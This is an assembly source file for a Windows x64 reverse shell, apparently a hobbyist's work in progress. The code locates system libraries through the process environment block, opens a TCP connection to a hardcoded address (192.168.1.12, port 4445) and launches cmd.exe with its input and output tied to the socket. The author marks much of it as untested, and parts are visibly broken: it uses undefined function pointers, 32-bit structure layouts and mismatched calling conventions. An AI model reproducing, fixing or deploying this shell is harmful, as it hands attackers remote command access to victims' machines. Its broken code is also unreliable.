; ========================
; @Maroder
; @for DevGnode 
; nasm -f win64 reverse_shell.s -o reverse_shell.o
; ld -m i386pep reverse_shell.o -o reverse_shell64.exe
;
; targets :
;	WINx64
;=========================
[BITS 64]


%define HANDLE DWORD
%define SOCKET DWORD

WSADESCRIPTION_LEN equ 	256
WSASYS_STATUS_LEN equ 	128

; ========================
; Structure
;=========================
struc STARTUPINFO
	.cb			resd	1
	.lpReserved		resd	1
	.lpDesktop		resd	1
	.lpTitle		resd	1
	.dwX			resd	1
	.dwY			resd	1
	.dwXSize		resd	1
	.dwYSize		resd	1
	.dwXCountChars		resd	1
	.dwYCountChars		resd	1
	.dwFillAttribute	resd	1
	.dwFlags		resd	1
	.wShowWindow		resw	1
	.cbReserved2		resw	1
	.lpReserved2		resd	1
	.hStdInput		resd	1
	.hStdOutput		resd	1
	.hStdError		resd	1
endstruc

struc PROCESS_INFORMATION
	.hProcess		resd	1
	.hThread		resd	1
	.dwProcessId		resd	1
	.dwThreadId		resd	1
endstruc

struc WSAData
	.wVersion		resw	1
	.wHighVersion		resw	1
	.iMaxSockets		resw	1
	.iMaxUdpDg		resw	1
	.lpVendorInfo		resd	1
	.szDescription		resb 	WSADESCRIPTION_LEN + 1
	.szSystemStatus		resb	WSASYS_STATUS_LEN + 1
endstruc

struc IN_ADDR
	.s_addr		resd	1
endstruc
struc SOCKADDR_IN
	.sin_family	resw	1
	.sin_port	resw	1
	.sin_addr	resd	1
	.sin_zero	resb	8
endstruc


	global _start
; ========================
; DATA
;=========================
section .data
	;LoadLibraryA: 	dd	0x770157B0 ; <--- NoNeed because use x64 bits, I dunno how get this addr via an exe, so i will try to remote TEB
	;GetProcAddress: dd	0x77014EE0 ; <---  NoNeed because use x64 bits
; ========================
; Pointer
;=========================
section .bss
	ssi resb 0x44
	spi resb 0x10
	swd resb 0x10A
	sss resb 0x10
	sin resb 0x4
; ========================
; text
;=========================
section .text

_start:

; Strack
; str
; str
; str
; 0000str
; kernel32 base
; ws2_32 base
; =----------------- return
;
;
	mov rbp, rsp		; stack
	sub rsp, 0x28		; string pointer
	
	;	lil understanding
	;	 fs:+0x60 --> TEB
	;	TEB:+0x18 --> ndll.dll section data
	;		*	[ntdll.data]+0x28 : 00763F90
	;				|
	;				|- [00763F90]+0x00 : ntdll.dll.data++
	;			[ntdll.dll.data++]+0x18 : 007638F0 
	;			AND
	;			[007638F0]+0x10 --> kernel32.dll
	;
	; ?? But if you retrace memory map x64 to TEB:+0x18 --> ndll.dll section data
	;	00000000|00000000|00000000|00000000|
	;	00000000|00763F90|00000000|00000000|
	;	00000000|00000000|**007638F0**|....
	;
	;	why do not make
	;	mov rdx, 0x60
	;	mov rdx, [gs:rdx]	; TEB
	;	mov rax, [rdx+0x18]	; ntdll.dll .section data
	;	mov esi, [rax+0x38]	--> 007638F0
	;	mov rdi, [rsi]		--> Kernel32.dll
	
	mov rdx, 0x60
	mov rdx, [gs:rdx]	; TEB
	mov rax, [rdx+0x18]	; ntdll.dll .section data
	mov esi, [rax+0x28]	; ??
	mov rdx, [rsi]		; ?? 
	mov eax, [rdx+0x18]	; KernelBase
	mov rdi, [rax+0x10]	; KERNELBASE.dll

	mov [rsp+0x18],rdi


	; ===========================
	; make stack pointer str :
	; ws2_32.dll
	;============================
	xor rax,rax
	mov [rsp+0x10],rax
	mov ax,0x6c6c			; ll
	mov [rsp+0x08],eax
	mov rax, 0x642e32335f327377 	; _2swd.23
	mov [rsp],rax
	lea rax,[esp]			; ws2_32.dll
	;push rax	
	
	;
	;NOT FINISHED TO HERE NOT TESTING, 
	;ONLY UP HAS BEEN TESTING 
	;

	mov edi, [LoadLibraryA]	; LoadLibraryAtry to get from FS pointer PEB/TEB
	call rdi			; call
	mov [rsp+0x1C], rax		; ESP+14 Offset ws2_32 base dll
	sub rsp, 0x08			; size 4 SOCKET HANDLE
	
	WSAStartup:
	xor rax, rax		
	mov [rsp+0x18],rax	
	mov rax,0x7075			; pu
	mov [rsp+0x10],eax	
	mov rax, 0x7472617453415357	; tratSASW
	mov [rsp+0x08],rax
	lea rdx,[rsp+0x08]		; WSAStartup	

	call getproc
	mov rdi,rax			; ws2_32.WSAStartup

	xor rax, rax
	push swd
	mov ax,0x0202
	push rax
	mov edi, 0x719F6A55 
	call rdi

	WSASocket:
	xor rax,rax
	mov ax,0x4174			; t
	mov [rsp+0x10],rax
	mov rax, 0x656b636f53415357	; ekcoSASW
	mov [rsp+0x08],rax
	lea rdx,[rsp+0x8]		; WSASocket

	call getproc
	mov rdi,rax			; ws2_32.WSASocket

	xor 	rax, rax
	push 	rax
	push 	rax
	push 	rax
	mov 	al,0x06	; IPPROTO_TCP
	push	rax	;
	sub 	al,0x05	; SOCK_STREAM
	push	rax	;
	add	al,0x01	; AF_INET
	push 	rax
	;mov 	edi,0x719F8B6A
	call 	rdi	
	
	cmp 	eax,0xFFFFFFFF
	je 	ret

	; socket Handle
	mov 	rdx,rax
	mov 	[rsp],rdx
	
	; SOCKADDR_IN
	xor rbx, rbx
	inc rbx
	inc rbx
	mov WORD[ sss + SOCKADDR_IN.sin_family ],bx		; AF_INET
	mov WORD[ sss + SOCKADDR_IN.sin_port ],  0x5D11		; port 4445
	mov DWORD[ sss + SOCKADDR_IN.sin_addr ], 0x0c01a8c0 	; IP   192.168.1.12

	WSAConnect:
	xor rax,rax			; raz eax
	mov ax,0x7463			; tc
	mov [rsp+0x10],eax
	mov rax, 0x656e6e6f43415357	; ennoCASW
	mov [rsp+0x08],rax
	lea edx,[rsp+0x08]		; WSAConnect

	call getproc
	mov rdi,rax		; ws2_32.WSAConnect

	xor rax,rax
	mov rsi,[rsp]		; SOCKET
	push rax		; 
	push rax		;
	push rax		;
	push rax		;
	mov al,0x10		; sizeof SOCKADDR
	push rax		;
	mov rax,sss 		; SOCKADDR
	push rax		;	
	push rsi		; socket Handle
	;mov edi, 0x71A00C81
	call rdi
	
	cmp eax,0xFFFFFFFF
	je ret

	xor rax,rax
	mov rdx, [esp]
	mov ah,0x01
	inc rax
	mov DWORD[ ssi + STARTUPINFO.dwFlags ], eax
	mov DWORD[ ssi + STARTUPINFO.hStdInput ], edx
	mov DWORD[ ssi + STARTUPINFO.hStdOutput ], edx
	mov DWORD[ ssi + STARTUPINFO.hStdError ], edx

	CreateProcess:
	xor 	rax, rax
	mov 	rax, 0x41737365636f	; seco
	mov 	[rsp+0x10],rax
	mov 	rax, 0x7250657461657243	; rPetaerC
	mov 	[rsp+0x08],rax
	lea 	rdx,[rsp+0x08]		; CreateProcessA

	mov 	rsi,[rsp+0x1C]	; kernel32 base
	push	rdx
	push 	rsi
	mov 	rdi,[GetProcAddress]
	call 	rdi
	mov	rdi, rax

	xor 	rax, rax
	push 	spi		; PROCESS_INFORMATION
	push 	ssi		; STARTUPINFO
	push 	rax		;
	push	rax		;
	push 	rax		;
	inc 	rax		;
	push 	rax		; true
	dec 	rax		;
	push 	rax		;
	push	rax		;
	push	_cmd		; Str CMD
	push	rax		;
	;mov 	edi, 0x7C80236B	; CreateProcessA
	call	rdi		; call
	
	ExitProcess:
	xor 	rax, rax
	mov 	rax,0x737365		; sse
	mov 	[rsp+0x10],eax
	mov 	rax, 0x636f725074697845	; corPtixE
	mov 	[rsp+0x08],eax
	lea 	rdx,[rsp+0x08]		; ExitProcess

	mov 	rsi,[rsp+0x1C]	; kernel32 base
	push	rdx
	push 	rsi
	mov 	rdi,[GetProcAddress]
	call 	rdi
	mov 	rdi, rax

	xor 	rax, rax
	push	rax
	call 	rdi
	
	ret:
	leave

getproc:
	mov 	rbx,[rsp+0x24]
	push 	rdx
	push 	rbx
	mov 	rdi,[GetProcAddress]
	call 	rdi
	ret

	_cmd: 	db "cmd.exe",0
